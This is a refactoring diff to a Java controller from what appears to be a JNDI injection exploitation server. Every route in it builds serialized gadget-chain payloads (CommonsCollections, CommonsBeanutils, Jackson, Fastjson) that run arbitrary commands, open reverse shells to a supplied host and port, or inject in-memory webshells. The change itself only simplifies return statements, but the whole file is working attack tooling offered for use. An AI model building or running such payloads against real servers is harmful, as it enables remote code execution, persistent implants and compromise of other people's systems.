@@ -34,8 +34,7 @@ public class DeserializeController implements Controller {
     public byte[] URLDNS(String url) throws Exception {
         System.out.println("[Deserialize] [URLDNS] URL: " + url);
 
-        byte[] data = URLDNS.create(url);
-        return data;
+        return URLDNS.create(url);
     }
 
     @JNDIMapping("/CommonsCollectionsK1/Command/{cmd}")
@@ -43,8 +42,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [CommonsCollectionsK1] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
-        byte[] data = CommonsCollectionsK1.create(templatesImpl);
-        return data;
+        return CommonsCollectionsK1.create(templatesImpl);
     }
 
     @JNDIMapping("/CommonsCollectionsK1/ReverseShell/{host}/{port}")
@@ -52,8 +50,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [CommonsCollectionsK1] [ReverseShell] Host: " + host + " Port: " + port);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
-        byte[] data = CommonsCollectionsK1.create(templatesImpl);
-        return data;
+        return CommonsCollectionsK1.create(templatesImpl);
     }
 
     @JNDIMapping("/CommonsCollectionsK1/MemShell/{server}/{tool}/{type}")
@@ -64,8 +61,7 @@ public class DeserializeController implements Controller {
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
-        byte[] data = CommonsCollectionsK1.create(templatesImpl);
-        return data;
+        return CommonsCollectionsK1.create(templatesImpl);
     }
 
     @JNDIMapping("/CommonsCollectionsK2/Command/{cmd}")
@@ -73,8 +69,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [CommonsCollectionsK2] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
-        byte[] data = CommonsCollectionsK2.create(templatesImpl);
-        return data;
+        return CommonsCollectionsK2.create(templatesImpl);
     }
 
     @JNDIMapping("/CommonsCollectionsK2/ReverseShell/{host}/{port}")
@@ -82,8 +77,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [CommonsCollectionsK2] [ReverseShell] Host: " + host + " Port: " + port);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
-        byte[] data = CommonsCollectionsK2.create(templatesImpl);
-        return data;
+        return CommonsCollectionsK2.create(templatesImpl);
     }
 
     @JNDIMapping("/CommonsCollectionsK2/MemShell/{server}/{tool}/{type}")
@@ -94,24 +88,21 @@ public class DeserializeController implements Controller {
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
-        byte[] data = CommonsCollectionsK2.create(templatesImpl);
-        return data;
+        return CommonsCollectionsK2.create(templatesImpl);
     }
 
     @JNDIMapping("/CommonsCollectionsK3/Command/{cmd}")
     public byte[] CommonsCollectionsK3Cmd(String cmd) throws Exception {
         System.out.println("[Deserialize] [CommonsCollectionsK3] [Command] Cmd: " + cmd);
 
-        byte[] data = CommonsCollectionsK3.create(cmd);
-        return data;
+        return CommonsCollectionsK3.create(cmd);
     }
 
     @JNDIMapping("/CommonsCollectionsK4/Command/{cmd}")
     public byte[] CommonsCollectionsK4Cmd(String cmd) throws Exception {
         System.out.println("[Deserialize] [CommonsCollectionsK4] [Command] Cmd: " + cmd);
 
-        byte[] data = CommonsCollectionsK4.create(cmd);
-        return data;
+        return CommonsCollectionsK4.create(cmd);
     }
 
     @JNDIMapping("/CommonsBeanutils183/Command/{cmd}")
@@ -119,8 +110,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [CommonsBeanutils183] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
-        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
-        return data;
+        return CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
     }
 
     @JNDIMapping("/CommonsBeanutils183/ReverseShell/{host}/{port}")
@@ -128,8 +118,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [CommonsBeanutils183] [ReverseShell] Host: " + host + " Port: " + port);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
-        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
-        return data;
+        return CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
     }
 
     @JNDIMapping("/CommonsBeanutils183/MemShell/{server}/{tool}/{type}")
@@ -140,8 +129,7 @@ public class DeserializeController implements Controller {
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
-        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
-        return data;
+        return CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
     }
 
     @JNDIMapping("/CommonsBeanutils194/Command/{cmd}")
@@ -149,8 +137,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [CommonsBeanutils194] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
-        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
-        return data;
+        return CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
     }
 
     @JNDIMapping("/CommonsBeanutils194/ReverseShell/{host}/{port}")
@@ -158,8 +145,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [CommonsBeanutils194] [ReverseShell] Host: " + host + " Port: " + port);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
-        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
-        return data;
+        return CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
     }
 
     @JNDIMapping("/CommonsBeanutils194/MemShell/{server}/{tool}/{type}")
@@ -170,8 +156,7 @@ public class DeserializeController implements Controller {
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
-        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
-        return data;
+        return CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
     }
 
     @JNDIMapping("/Jackson/Command/{cmd}")
@@ -179,8 +164,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [Jackson] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
-        byte[] data = Jackson.create(templatesImpl);
-        return data;
+        return Jackson.create(templatesImpl);
     }
 
     @JNDIMapping("/Jackson/ReverseShell/{host}/{port}")
@@ -188,8 +172,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [Jackson] [ReverseShell] Host: " + host + " Port: " + port);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
-        byte[] data = Jackson.create(templatesImpl);
-        return data;
+        return Jackson.create(templatesImpl);
     }
 
     @JNDIMapping("/Jackson/MemShell/{server}/{tool}/{type}")
@@ -200,8 +183,7 @@ public class DeserializeController implements Controller {
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
-        byte[] data = Jackson.create(templatesImpl);
-        return data;
+        return Jackson.create(templatesImpl);
     }
 
     @JNDIMapping("/Fastjson1/Command/{cmd}")
@@ -209,8 +191,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [Fastjson1] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
-        byte[] data = Fastjson1.create(templatesImpl);
-        return data;
+        return Fastjson1.create(templatesImpl);
     }
 
     @JNDIMapping("/Fastjson1/ReverseShell/{host}/{port}")
@@ -218,8 +199,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [Fastjson1] [ReverseShell] Host: " + host + " Port: " + port);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
-        byte[] data = Fastjson1.create(templatesImpl);
-        return data;
+        return Fastjson1.create(templatesImpl);
     }
 
     @JNDIMapping("/Fastjson1/MemShell/{server}/{tool}/{type}")
@@ -230,8 +210,7 @@ public class DeserializeController implements Controller {
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
-        byte[] data = Fastjson1.create(templatesImpl);
-        return data;
+        return Fastjson1.create(templatesImpl);
     }
 
     @JNDIMapping("/Fastjson2/Command/{cmd}")
@@ -239,8 +218,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [Fastjson2] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
-        byte[] data = Fastjson2.create(templatesImpl);
-        return data;
+        return Fastjson2.create(templatesImpl);
     }
 
     @JNDIMapping("/Fastjson2/ReverseShell/{host}/{port}")
@@ -248,8 +226,7 @@ public class DeserializeController implements Controller {
         System.out.println("[Deserialize] [Fastjson2] [ReverseShell] Host: " + host + " Port: " + port);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
-        byte[] data = Fastjson2.create(templatesImpl);
-        return data;
+        return Fastjson2.create(templatesImpl);
     }
 
     @JNDIMapping("/Fastjson2/MemShell/{server}/{tool}/{type}")
@@ -260,7 +237,6 @@ public class DeserializeController implements Controller {
         MemShellPayload.printInfo(result);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(result.getInjectorBytes());
-        byte[] data = Fastjson2.create(templatesImpl);
-        return data;
+        return Fastjson2.create(templatesImpl);
     }
 }
